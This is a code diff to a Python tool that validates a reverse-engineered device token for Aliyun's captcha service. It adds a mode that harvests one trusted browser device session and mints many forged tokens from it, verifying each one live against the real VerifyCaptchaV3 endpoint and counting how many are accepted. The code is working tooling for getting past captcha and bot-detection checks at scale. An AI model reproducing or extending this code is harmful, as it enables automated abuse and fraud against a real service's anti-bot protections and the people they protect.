@@ -87,7 +87,20 @@ from replay_template import (
     md5_hex,
 )
 
-LIVE_CAPTURES = Path(__file__).resolve().parent / "live_captures.md"
+
+def _live_captures_path() -> Path:
+    """Locate live_captures.md.
+
+    The capture file lives in .assets/resources/; older revisions of these
+    scripts kept it next to them, so both locations are probed.
+    """
+    here = Path(__file__).resolve().parent
+    for cand in (here / "live_captures.md", here.parent / "resources" / "live_captures.md"):
+        if cand.exists():
+            return cand
+    return here / "live_captures.md"
+
+LIVE_CAPTURES = _live_captures_path()
 
 # Verbatim live-session expectations (live_captures.md §3 — strict dry-run anchors).
 EXPECTED_SESSION_KEY = "682efd18149e39a6"
@@ -255,10 +268,19 @@ def build_payload_live(
         raise ValueError(f"HC2 violation: initTime→serverTs gap {server_ts - init_time} ms")
     session_id = session["sessionId"]
     embedded = int(session_id.split("-h-")[1].split("-")[0])
-    if embedded != server_ts - 1:
-        raise ValueError(f"HC1 violation: sessionId embedded ts {embedded} != serverTs−1")
-    if not (1 <= entry94_jitter_ms <= 15):
-        raise ValueError(f"entry-94 jitter {entry94_jitter_ms} outside 1–15 ms")
+    # The gap between the sessionId's embedded ts and the DeviceConfig's
+    # serverTs is 1 s in the archived capture and 2 s in the 2026-10-21 live
+    # capture, so the invariant is a window (see device_token_gen.build_payload).
+    if not (server_ts - 3 <= embedded <= server_ts):
+        raise ValueError(
+            f"HC1 violation: sessionId embedded ts {embedded} is more than 3 s away "
+            f"from serverTs ({server_ts})"
+        )
+    # The archived capture showed 9-15 ms; a live collector run of 2026-10-21
+    # produced 46 ms, so the delta is a per-collector artefact - only its sign
+    # and plausibility are invariants.
+    if not (1 <= entry94_jitter_ms <= 1000):
+        raise ValueError(f"entry-94 jitter {entry94_jitter_ms} outside the sane 1-1000 ms range")
 
     fields = template
     fields[72] = str(init_time)
@@ -342,17 +364,59 @@ def mint_token(
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ver_test.py loading (import-safe: main() only runs under __main__)
+# captcha primitives (import-safe)
 # ─────────────────────────────────────────────────────────────────────────────
+#
+# ver_test.py was removed in an earlier cleanup of this folder, which left
+# live_validate.py --live unable to run at all (it could not load its
+# primitives).  captcha_param_gen.py carries the very same primitives
+# (generate_arg / ali_hash / encrypt) and is now import-safe, so it is used as
+# the single source of truth and shimmed to the names used here.
+
+
+class _CaptchaPrimitives:
+    """Thin adapter exposing ver_test.py's names on top of captcha_param_gen."""
+
+    def __init__(self, mod: Any) -> None:
+        self._m = mod
+        self.ACCESS_KEY = mod.access_key
+        self.SECRET_KEY = mod.secret
+        self.SCENE_ID = mod.scene
+        self.API_VERSION = mod.API_VERSION
+        self.VERIFY_ENDPOINT = mod.VERIFY_ENDPOINT
+        self.INIT_ENDPOINT = mod.INIT_ENDPOINT
+
+    def generate_arg(self, certify_id: str) -> str:
+        return self._m.generate_arg(certify_id)
+
+    def ali_hash(self, data: str, salt: str) -> str:
+        return self._m.ali_hash(data, salt)
+
+    def encrypt(self, data: bytes) -> str:
+        return self._m.encrypt(data)
+
+    def base64_encode(self, data: Any) -> str:
+        return self._m.base64_encode(data)
+
+    def current_time_millis(self) -> int:
+        return self._m.current_time_millis()
+
+    def get_timestamp_utc(self) -> str:
+        return self._m.get_timestamp()
+
+    def generate_uuid(self) -> str:
+        return self._m.generate_uuid()
+
+    def generate_signature(self, params: Dict[str, str], secret: str) -> str:
+        return self._m.generate_signature(params, secret)
 
 
 def load_ver_test() -> Any:
-    spec = importlib.util.spec_from_file_location(
-        "ver_test", Path(__file__).resolve().parent / "ver_test.py"
-    )
-    vt = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(vt)
-    return vt
+    """Return the captcha primitives (kept under the historical name so the
+    call sites stay untouched)."""
+    import captcha_param_gen as _cpg
+
+    return _CaptchaPrimitives(_cpg)
 
 
 def build_verify_data(vt: Any, certify_id: str) -> Dict[str, str]:
@@ -806,12 +870,122 @@ def run_live(args: argparse.Namespace) -> int:
 # ─────────────────────────────────────────────────────────────────────────────────────
 
 
+def run_session_mint(args: argparse.Namespace) -> int:
+    """LIVE: N tokens from ONE harvested (trusted) device session.
+
+    This is the flow cmd/token-collector now implements in Go:
+
+      * the browser is used ONCE to obtain a device session the Aliyun risk
+        layer trusts (the Log1 issuer is what is judged - the request bytes are
+        byte-identical to the SDK's, and a foreign fingerprint still verifies);
+      * N tokens are then minted from that one session (only field 74 and the
+        trailing 93/94 log entries move - exactly the SDK's own T1 -> T2 pair);
+      * every token is verified with its OWN InitCaptchaV3, because a
+        CertifyId is single-use (reusing one answers F008 "duplicate").
+
+    The session file is the JSON produced by the collector:
+      {"session": {sessionKey, sessionId, serverTs, initTime, ip, tC},
+       "template": [ ...the genuine collector payload fields... ]}
+    """
+    banner("LIVE — N tokens from ONE harvested device session")
+    log = CheckLog()
+    vt = load_ver_test()
+    access_key, secret, scene_id = vt.ACCESS_KEY, vt.SECRET_KEY, vt.SCENE_ID
+
+    with open(args.session, "r", encoding="utf-8") as fh:
+        blob = json.load(fh)
+    session = {k: str(v) for k, v in blob["session"].items()}
+    template = list(blob["template"])
+    print_session(session)
+    print(f"    template: {len(template)} fields, slot21={template[21] if len(template) > 21 else '?'}")
+
+    accepted = 0
+    for i in range(1, args.session_mint + 1):
+        hr(f"[token {i}/{args.session_mint}] own InitCaptchaV3 → mint → verify")
+
+        # fresh CertifyId per token (a CertifyId is single-use)
+        params = dtg.generate_init_params(access_key, secret, scene_id)
+        init_status, init_raw = 0, None
+        for endpoint in (dtg.INIT_ENDPOINT, dtg.INIT_ENDPOINT_FALLBACK):
+            try:
+                init_status, init_raw = post_rpc(endpoint, params, args.timeout)
+                break
+            except requests.RequestException as exc:
+                print(f"  [init] {endpoint} failed: {exc!r}")
+        if init_raw is None:
+            print("  [init] FAILED on both endpoints.")
+            return 1
+        init_json = json.loads(init_raw)
+        if not init_json.get("Success") or not init_json.get("CertifyId"):
+            print("  [init] no Success/CertifyId — aborting.")
+            return 1
+        certify_id = init_json["CertifyId"]
+        print(f"  [init] CertifyId = {certify_id}")
+
+        jitter = random.randint(9, 15)
+        try:
+            payload, token, v = mint_token(
+                session, int(time.time() * 1000), jitter, args.gather_cost, log, f"session#{i}"
+            )
+        except ValueError as exc:
+            print(f"  [mint] guard fired ({exc}) — retrying in 3s…")
+            time.sleep(3)
+            payload, token, v = mint_token(
+                session, int(time.time() * 1000) + 3000, jitter, args.gather_cost, log, f"session#{i}"
+            )
+
+        vd = build_verify_data(vt, certify_id)
+        cvp = json.dumps(
+            {"certifyId": certify_id, "data": vd["data"], "deviceToken": token,
+             "sceneId": scene_id},
+            separators=(",", ":"), ensure_ascii=False,
+        )
+        vparams = {
+            "AccessKeyId": access_key,
+            "Action": "VerifyCaptchaV3",
+            "Format": "JSON",
+            "SignatureMethod": "HMAC-SHA1",
+            "SignatureVersion": "1.0",
+            "Timestamp": vt.get_timestamp_utc(),
+            "Version": vt.API_VERSION,
+            "SceneId": scene_id,
+            "CertifyId": certify_id,
+            "CaptchaVerifyParam": cvp,
+            "SignatureNonce": vt.generate_uuid(),
+        }
+        vparams["Signature"] = vt.generate_signature(vparams, secret)
+        try:
+            ver_status, ver_raw = post_rpc(vt.VERIFY_ENDPOINT, vparams, args.timeout)
+        except requests.RequestException as exc:
+            print(f"  [verify] request failed: {exc!r}")
+            return 1
+        classification, exit_code = classify_verify_response(ver_status, ver_raw)
+        rj = json.loads(ver_raw)
+        vc = (rj.get("Result") or {}).get("VerifyCode")
+        ok = bool((rj.get("Result") or {}).get("VerifyResult"))
+        if ok:
+            accepted += 1
+        print(f"  [verify] HTTP {ver_status} → {vc} (accepted={ok}) — {classification}")
+        if exit_code == 4:
+            return 4
+
+    hr()
+    print(f"SESSION-MINT RESULT: {accepted}/{args.session_mint} tokens accepted "
+          f"(same device session, own CertifyId each)")
+    return 0 if accepted == args.session_mint else 3
+
+
 def main() -> int:
     ap = argparse.ArgumentParser(
         description="End-to-end validator for the reverse-engineered feilin deviceToken "
                     "(dry-run by default; --live performs real network requests).")
     ap.add_argument("--live", action="store_true",
                     help="perform REAL InitCaptchaV3 + VerifyCaptchaV3 network requests")
+    ap.add_argument("--session-mint", type=int, default=0,
+                    help="LIVE: mint N tokens from ONE harvested device session "
+                         "(--session <file>) and verify each with its own CertifyId")
+    ap.add_argument("--session", type=str, default="",
+                    help="harvested session JSON (session + genuine payload template)")
     ap.add_argument("--retries", type=int, default=1,
                     help="live attempts (each = fresh InitCaptcha + fresh mint + verify; "
                          "default 1 — FACT 1: one verify per minted token)")
@@ -823,8 +997,13 @@ def main() -> int:
     if not (500 <= args.gather_cost <= 5000):
         print(f"--gather-cost must be 500–5000 (HC3); got {args.gather_cost}")
         return 1
+    if args.session_mint and not args.session:
+        print("--session-mint needs --session <harvested session json>")
+        return 1
 
     try:
+        if args.session_mint:
+            return run_session_mint(args)
         return run_live(args) if args.live else run_dry(args)
     except ValidationFailure as exc:
         print(f"\nSTRICT VALIDATION FAILURE: {exc}")
